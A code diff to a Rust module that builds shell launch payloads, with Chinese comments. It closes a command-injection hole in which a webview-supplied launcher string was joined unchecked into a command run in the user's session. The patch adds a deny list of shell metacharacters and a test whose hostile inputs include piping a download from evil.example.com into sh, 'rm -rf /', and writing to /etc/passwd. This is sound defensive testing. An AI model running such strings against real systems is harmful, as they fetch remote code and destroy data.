@@ -178,8 +178,14 @@ pub struct PayloadSpec<'a> {
     /// `None` = 不加 `cd`。**顺序不是任意的**：`cd` 排在 env 之后、argv 之前
     /// （`<envOps>cd '<cwd>' && <argv>`），早期实现曾把它放最前面，逐字节对拍时抓到。
     pub cwd: Option<&'a str>,
-    /// 已 sanitize 过的 launcher（sanitize **必须先于** wrap —— 那是函数组合上的结构保证，
-    /// 本 crate 收的是**结果**，不在这里再 sanitize 一次）。
+    /// launcher。**sanitize 必须先于 wrap**（设计债 #2）。
+    ///
+    /// ⚠ **08-08 订正**：本行原写「那是函数组合上的**结构保证**，本 crate 收的是结果，
+    /// 不在这里再 sanitize 一次」——**当时不成立**：字段是裸 `&str`，而 wire 那条路
+    /// （`launch_wire.rs`）把 `&req.launcher`（**来自 webview**）原样传了进来，
+    /// 中间没有任何净化。所谓「结构保证」只是一句调用约定。
+    /// ⇒ `render_payload` 现在自己拒注入字符（见那里的注释），
+    /// 由 `the_launcher_is_refused_when_it_carries_injection_chars` 钉住。
     pub launcher: &'a str,
     pub args: &'a [&'a str],
     pub wrap: &'a [WrapSpec<'a>],
@@ -281,6 +287,26 @@ pub fn render_payload(spec: &PayloadSpec) -> Result<String, String> {
             ));
         }
     }
+    // ★ **launcher 也要过一道**〔audit-0805 08-08〕：本函数对 `args` 逐个过白名单，
+    // 而 `launcher` 此前**一个检查都没有** —— 它被直接拼进 `argv` 再 `join(" ")`。
+    // 这条路的上游是 tauri 命令 `render_launch_payload`：`launcher` 来自 webview，
+    // 渲出来的载荷会被**键进用户的会话执行**。
+    //
+    // 字符集镜像 TS 的 `sanitizeRemoteLauncher`（今天真正管着这条路的那份策略），
+    // 但按本函数的既有惯例**返回 `Err` 而不是静默回落**：拒绝要让调用方看得见。
+    // ⚠ 刻意**不复用** `history::sanitize_launcher` 的白名单 —— 它排掉了 `/`，
+    // 而远端 launcher 合法地可以是 `/usr/local/bin/claude`（收太紧 = 把一个洞换成一个回归）。
+    if let Some(c) = spec
+        .launcher
+        .chars()
+        .find(|c| matches!(c, ';' | '|' | '&' | '$' | '`' | '<' | '>' | '\n' | '\r'))
+    {
+        return Err(format!(
+            "拒绝拼入命令：launcher {:?} 含注入字符 {c:?} —— 载荷会被键进会话执行，\n\
+             一个 `;` 或 `|` 就能另起一条命令。合法形态是命令名或路径（可带空格分段）。",
+            spec.launcher
+        ));
+    }
     let mut argv = vec![spec.launcher];
     argv.extend_from_slice(spec.args);
     let inner = argv.join(" ");
@@ -337,6 +363,74 @@ pub fn usage_probe_payload(
 
 #[cfg(test)]
 mod tests {
+    /// ★★ **`launcher` 也要拒绝注入字符**〔audit-0805 08-08，Phase G 第 93 件〕。
+    ///
+    /// # 先核出来的不对称
+    ///
+    /// `render_payload` 对 `args` 逐个过 `arg_is_join_safe`（白名单），而 **`launcher`
+    /// 一个检查都没有** —— 它被直接 `push` 进 `argv` 再 `join(" ")`。
+    /// 而 `render_launch_payload` 是**注册过的 tauri 命令**：`launcher` 来自 webview，
+    /// 渲出来的载荷会被键进用户的会话执行。
+    ///
+    /// 该字段的头注写着「已 sanitize 过的 launcher …… 本 crate 收的是**结果**」——
+    /// 那是**调用约定**，不是这一侧的保证：wire 那条路（`launch_wire.rs`）把
+    /// `&req.launcher` 原样传了进来，中间没有任何净化。
+    ///
+    /// # 为什么用「拒绝这几个字符」而不是复用别处的白名单
+    ///
+    /// 仓里已有两份 launcher 策略，**各自服务不同的合法形状**：
+    /// · TS 的 `sanitizeRemoteLauncher`：拒 ``[;|&$`<>\r\n]`` ⇒ 回落默认 launcher；
+    /// · Rust 的 `history::sanitize_launcher`：白名单（字母数字 `- _ .` 空格）⇒ `Err`。
+    ///
+    /// 后者**排掉了 `/`**，而远端 launcher 合法地可以是 `/usr/local/bin/claude`；
+    /// 直接复用它会把正当用法判死（**收太紧 = 把一个洞换成一个回归**，第 86 件的教训）。
+    /// ⇒ 这里镜像**今天真正管着这条路**的那份策略（TS 那条）的字符集，
+    /// 但按本函数的既有惯例**返回 `Err` 而不是静默回落** —— 与 `args` 那一支一致：
+    /// 拒绝要让调用方看得见，静默替换会让人以为自己填的生效了。
+    #[test]
+    fn the_launcher_is_refused_when_it_carries_injection_chars() {
+        for bad in [
+            "claude; curl evil.example.com | sh",
+            "claude && rm -rf /",
+            "claude `id`",
+            "claude $(id)",
+            "claude\nrm -rf /",
+            "claude > /etc/passwd",
+        ] {
+            let r = super::render_payload(&super::PayloadSpec {
+                env: &[],
+                cwd: None,
+                launcher: bad,
+                args: &[],
+                wrap: &[],
+            });
+            assert!(
+                r.is_err(),
+                "`launcher` = {bad:?} 被原样拼进了载荷：{:?}\n\
+                 ★ 这条路是 tauri 命令 `render_launch_payload` ⇒ `launcher` 来自 webview，\n\
+                 而渲出来的载荷会被**键进用户的会话执行**。\n\
+                 ⚠ 同一个函数对 `args` 逐个过白名单，`launcher` 却一个检查都没有 —— \n\
+                 那份不对称正是本条要挡的。",
+                r.ok()
+            );
+        }
+        // 正例：合法 launcher 不许被误伤（收太紧 = 把一个洞换成一个回归）。
+        for ok in [
+            "claude",
+            "/usr/local/bin/claude",
+            "wsl claude",
+            "claude-code.exe",
+        ] {
+            let r = super::render_payload(&super::PayloadSpec {
+                env: &[],
+                cwd: None,
+                launcher: ok,
+                args: &[],
+                wrap: &[],
+            });
+            assert!(r.is_ok(), "合法 launcher {ok:?} 被拒了：{:?}", r.err());
+        }
+    }
 
     /// ★★ **载荷的拼装只许有一份 Rust 实现**〔audit-0805 08-08，Phase G 第 62 件，E3〕。
     ///
